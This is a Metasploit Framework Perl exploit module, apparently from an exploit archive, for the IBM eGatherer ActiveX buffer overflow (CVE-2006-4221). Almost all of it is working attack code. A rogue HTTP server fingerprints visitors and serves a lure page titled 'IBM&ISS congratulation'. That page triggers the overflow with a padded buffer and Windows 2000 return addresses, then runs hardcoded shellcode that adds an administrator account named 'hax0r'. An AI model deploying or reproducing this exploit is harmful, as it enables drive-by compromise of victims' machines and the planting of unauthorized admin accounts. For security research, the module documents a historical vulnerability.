IBM eGatherer <= 3.20.0284.0 (ActiveX) Remote Code Execution Exploit
====================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ibm_egatherer;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use Msf::Encoder;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
  };

my $info =
  {
	&#039;Name&#039;           => &#039;IBM eGatherer ActiveX Code Execution Vulnerability&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
	&#039;Authors&#039;        =>
	  [
		&#039;Francisco Amato <famato [at] infobyte.com.ar> [ISR] www.infobyte.com.ar&#039;,
	  ],

	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This module exploits a code execution vulnerability in the IBM eGatherer ActiveX buffer overflow.
}),
        &#039;Arch&#039;           => [ &#039;x86&#039; ],
        &#039;OS&#039;    => [&#039;win32&#039;, &#039;win2000&#039; ],
					
	&#039;Priv&#039;           => 0,

	&#039;UserOpts&#039;       =>
	  {
		&#039;HTTPPORT&#039; => [ 1, &#039;PORT&#039;, &#039;The local HTTP listener port&#039;, 8080      ],
		&#039;HTTPHOST&#039; => [ 0, &#039;HOST&#039;, &#039;The local HTTP listener host&#039;, "0.0.0.0" ],

	  },

        &#039;AutoOpts&#039;  =>
	          {
            	    &#039;GETPCTYPE&#039; => &#039;ebx&#039;
		  },
	&#039;Payload&#039;        =>
	  {
		&#039;Space&#039;    => 700,
		&#039;BadChars&#039;  => "\x00\x88\x8e\x89\x83\x96\x98\x91\x80\x9f\x93\x97\x8c\x99\x9c\x9b\x92", # data is downcased				
		&#039;Keys&#039;     => [&#039;+alphanum&#039;],
		
	  },
	&#039;Refs&#039;           =>
	  [
	  	[&#039;OSVDB&#039;, &#039;27976&#039;],	  
	  	[&#039;CVE&#039;, &#039;CVE-2006-4221&#039;],
	  	[&#039;BID&#039;, &#039;19554&#039;],
	  	[&#039;URL&#039;, &#039;http://research.eeye.com/html/advisories/published/AD20060816.html&#039;],
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
		[ &#039;Windows 2000 SP4 English version&#039;, 0x75041111, 0x7CE8E1B6  ]
#		[ &#039;Windows 2000 SP4 English version&#039;, 0x41414141, 0x7CE8E1B6  ] test
#		75032DB6
#//7CE8E1B6 CALL ole32.dll
#//75041111 .data WS2_32.DLL		
	  ],
	
	&#039;Keys&#039;           => [ &#039;ibm&#039; ],

	&#039;DisclosureDate&#039; => &#039;Aug 16 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}


sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;HTTPHOST&#039;),
		LocalPort => $self->GetVar(&#039;HTTPPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;
	);
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar(&#039;HTTPPORT&#039;));
		return;
	}

	my $httphost = ($self->GetVar(&#039;HTTPHOST&#039;) eq &#039;0.0.0.0&#039;) ?
		Pex::Utils::SourceIP(&#039;1.2.3.4&#039;) :
		$self->GetVar(&#039;HTTPHOST&#039;);

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar(&#039;HTTPPORT&#039;) ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;
	
	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {
		
		$line =~ s/^\s+|\s+$//g;
		
		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}
	
	my $os = &#039;Unknown&#039;;
	my $vl = ($agent =~ m/Windows/) ? &#039;Vulnerable&#039; : &#039;Not Vulnerable&#039;;
	
	$os = &#039;Linux&#039;     if $agent =~ /Linux/i;
	$os = &#039;Mac OS X&#039;  if $agent =~ /OS X/i;
	$os = &#039;Windows&#039;   if $agent =~ /Windows/i;	
	
	
	$self->PrintLine("[*] Client connected from $rhost:$rport ($os/$vl).");
	
	if ($os ne &#039;Windows&#039;) {
		$self->PrintLine("[*] Invalid target for this exploit, trying anyways...");
	} else {
		$self->PrintLine("[*] Sending payload and waiting for execution...");	
	}

	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML()));

	$fd->Close();
}

sub JSUnescape2 {
	#TODO: add to Pex:Utils:JSUnescape like type of mode
        my $data = shift;
        my $mode = shift() || &#039;LE&#039;;
        my $code = &#039;&#039;;

        # Encode the shellcode via %u sequences for JS&#039;s unescape() function
        my $idx = 0;

        # Pad to an even number of bytes
        if (length($data) % 2 != 0) {
                $data .= substr($data, -1, 1);
        }

        while ($idx < length($data) - 1) {
                my $c1 = ord(substr($data, $idx, 1));
                my $c2 = ord(substr($data, $idx+1, 1));
                if ($mode eq &#039;LE&#039;) {
                        $code .= sprintf(&#039;%%%.2x%%%.2x&#039;, $c2, $c1);
                } else {
                        $code .= sprintf(&#039;%%%.2x%%%.2x&#039;, $c1, $c2);
                }
                $idx += 2;
        }

        return $code;
}


sub GenerateHTML {
	my $self        = shift;
	my $target      = $self->Targets->[$self->GetVar(&#039;TARGET&#039;)];
	my $shellcode = JSUnescape2($self->GetVar(&#039;EncodedPayload&#039;)->Payload, &#039;RE&#039;);	
        my $offsetdata = JSUnescape2(pack(&#039;V&#039;, $target->[1]),&#039;R&#039;);
	my $offsetesp = JSUnescape2(pack(&#039;V&#039;, $target->[2]),&#039;R&#039;);

#adduser, user: hax0r pass: vete
my $shellcode = &#039;%31%c9%66%b9%30%72%51%68%20%68%61%78%68%2f%41%44%44%68%72%65%73%20%68%72%61%64%6f%68%6e%69%73%74%68%41%64%6d%69%68%6f%75%70%20%68%61%6c%67%72%68%20%6c%6f%63%68%20%6e%65%74%68%44%20%26%26%68%20%2f%41%44%68%76%65%74%65%68%78%30%72%20%68%72%20%68%61%68%20%75%73%65%68%20%6e%65%74%68%65%20%2f%63%68%64%2e%65%78%68%41%41%63%6d%31%c0%50%31%c0%8d%4c%24%06%51%bb%fa%74%59%7c%ff%d3%31%c0%50%bb%be%69%47%79%ff%d3&#039;;
#$self->PrintLine($shellcode2);
#my $shellcode = $shellcode2;


	my $data        = qq#
<html>
<head>
	<title>IBM&ISS congratulation</title>

</head>
<object classid=&#039;clsid:74FFE28D-2378-11D5-990C-006094235084&#039; id=&#039;notCompromising&#039;></object>
<script>
var buff="";
for (i=0;i<260;i++) buff=buff+unescape("%90"); //padding
//75041111 .data WS2_32.DLL
buff=buff+unescape("$offsetdata"); //.data
buff=buff+unescape("$offsetdata"); //.data
for (i=0;i<12;i++) buff=buff+unescape("%90"); //padding
//7CE4F8A6 CALL ESP ole32.dll
buff=buff+unescape("$offsetesp"); //write eip
buff=buff+unescape("$offsetesp"); //write eip
for (i=0;i<80;i++) buff=buff+unescape("%90"); //padding
//JMP safe ? shellcode
buff=buff+unescape("%E9%FD%FA%FF%FF"); //adduser
//buff=buff+unescape("%E9%2B%F8%FF%FF"); //size 500
//buff=buff+unescape("%E9%AF%F6%FF%FF");  //size 700
for (i=0;i<80;i++) buff=buff+unescape("%90"); //padding

//shellcode TODO: copy writeable memory
buff=buff+unescape("$shellcode");

for (i=0;i<50;i++)buff=buff+unescape("%90"); //shit

var comp = document.getElementById(&#039;notCompromising&#039;);
comp.RunEgatherer(buff);
//alert(buff);

</script>

</body>
</html>
#;
	return $data;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar(&#039;Gzip&#039;)) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar(&#039;Chunked&#039;)) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= &#039;Content-Length: &#039; . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), &#039;&#039;);
		$chunked .= sprintf(&#039;%x&#039;, length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, &#039;gzip&#039;, &#039;-&#039;.$comp, &#039;-c&#039;, &#039;--force&#039;);
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}

1;


